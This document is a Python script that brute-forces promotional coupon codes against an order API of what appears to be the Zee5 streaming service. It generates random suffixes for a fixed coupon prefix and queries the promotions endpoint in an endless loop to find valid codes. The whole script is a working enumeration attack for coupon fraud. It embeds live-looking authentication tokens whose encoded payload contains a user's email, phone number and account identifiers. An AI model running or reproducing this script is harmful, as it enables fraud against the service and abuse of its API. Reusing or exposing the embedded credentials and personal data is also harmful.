import json
import string
import time
import random
import requests

xaccesstoken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwbGF0Zm9ybV9jb2RlIjoiV2ViQCQhdDM4NzEyIiwiaXNzdWVkQXQiOiIyMDIzLTEyLTE1VDIyOjM2OjA2LjMzN1oiLCJwcm9kdWN0X2NvZGUiOiJ6ZWU1QDk3NSIsInR0bCI6ODY0MDAwMDAsImlhdCI6MTcwMjY3OTc2Nn0.AZSN3EDEmg7CcL-bAOoqZQBp7LzqBWj_CnRNWJbG21s"
coupon_code = 'Z5CPMA23Y'
bearer_token = "eyJraWQiOiJlNmxfbGYweHpwYVk4VzBNcFQzWlBzN2hyOEZ4Y0trbDhDV0JaekVKT2lBIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJENDAxRDUzQy1CQzI0LTRBNzQtQjQzNy05NkY5MzE0MDc0MEEiLCJzdWJzY3JpcHRpb25zIjoiW10iLCJhY3RpdmF0aW9uX2RhdGUiOiIyMDIyLTAzLTA0VDA1OjU3OjA1LjU2M1oiLCJhbXIiOlsiZGVsZWdhdGlvbiJdLCJpc3MiOiJodHRwczovL3VzZXJhcGkuemVlNS5jb20iLCJjdXJyZW50X2NvdW50cnkiOiJJTiIsImNsaWVudF9pZCI6InJlZnJlc2hfdG9rZW4iLCJhY2Nlc3NfdG9rZW5fdHlwZSI6IkRlZmF1bHRQcml2aWxlZ2UiLCJ1c2VyX3R5cGUiOiJSZWdpc3RlcmVkIiwidXNlcl9tb2JpbGUiOiI5MTgxNzgwMjM5NTMiLCJzY29wZSI6WyJ1c2VyYXBpIiwic3Vic2NyaXB0aW9uYXBpIiwicHJvZmlsZWFwaSJdLCJhdXRoX3RpbWUiOjE3MDI2ODI5NjksImV4cCI6MTcwNTMxMjk2OSwiaWF0IjoxNzAyNjgyOTY5LCJqdGkiOiI2YzliNjAyNy03NzU5LTQwODEtYWY4My1hMWM0NTBkMzVmNjEiLCJ1c2VyX2VtYWlsIjoicm9zaGFucHJpbmNlMTYzMzJAZ21haWwuY29tIiwiZGV2aWNlX2lkIjoiMjQxN2FmYjYtY2U2Yy00MDgwLWJhYTEtMzNhNTc3ZjkwYjhjIiwicmVnaXN0cmF0aW9uX2NvdW50cnkiOiJJTiIsInZlcnNpb24iOjUsImF1ZCI6WyJ1c2VyYXBpIiwic3Vic2NyaXB0aW9uYXBpIiwicHJvZmlsZWFwaSJdLCJzeXN0ZW0iOiJaNSIsIm5iZiI6MTcwMjY4Mjk2OSwiaWRwIjoibG9jYWwiLCJ1c2VyX2lkIjoiZDQwMWQ1M2MtYmMyNC00YTc0LWI0MzctOTZmOTMxNDA3NDBhIiwiY3JlYXRlZF9kYXRlIjoiMjAyMi0wMy0wNFQwNTo1NzowNS41NjNaIiwiYWN0aXZhdGVkIjp0cnVlfQ.HPO77H6qqEVxwGlPajQfneGxLePfN11Rte6s9F0EJ_JJLOH7yf8vFfXNruwKbW_lZhzbHK48TRxUxFR09T6IfXHxNJ8qI2I1QASj9gBI3-fkNM9RAPv0-Lke1RyhhN7E7SQ6hlTUN6YWFCAkh9sy_gaCAeQmP4O3Zs3aVq3FK9UdEswuf477_4g-07gA0i_hkn8_BcHL9PVZ4Gp_Z6W6uoWyV7C--TBJel9piE4dEY9iXRueHMTLsgaVRskl2HWoBrw0RvQeEnRVJ66DhyzTIa8yiqEeKUKKx31th8GVdhmfm2YYcr7QMq0Xr4XM2uKcemAiGXsZAGBO3iGIw88UUw"


# def generate_random_alpha_numeric():
#     alphanumeric = string.ascii_letters + string.digits
#     return ''.join(random.choice(alphanumeric) for _ in range(5)).upper()
def generate_random_alpha_numeric():
    num_count = random.randint(2, 3)  # Randomly choose 2 or 3 digits
    letter_count = 5 - num_count  # Remaining characters will be letters

    nums = ''.join(random.choices(string.digits, k=num_count))
    letters = ''.join(random.choices(string.ascii_uppercase, k=letter_count))

    return ''.join(random.sample(nums + letters, len(nums + letters)))


def updated_coupan():
    return coupon_code+generate_random_alpha_numeric()
def apiCall(coupon_code):
    url = f'https://oms-co.zee5.com/order-bff/v3/promotions?coupon_code={coupon_code}&country_code=IN'
    headers = {
        'Authorization': f'bearer {bearer_token}',
        'X-Access-Token': xaccesstoken
    }
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        print(coupon_code)
        print(json.dumps(data,indent=2))
        return data  # Returning the JSON response
    else:
        # print("Failed to fetch data. Status code:", response.status_code)
        # print(coupon_code)
        return None


while True:
    coupan=updated_coupan()
    apiCall(coupan)
    time.sleep(0.2)
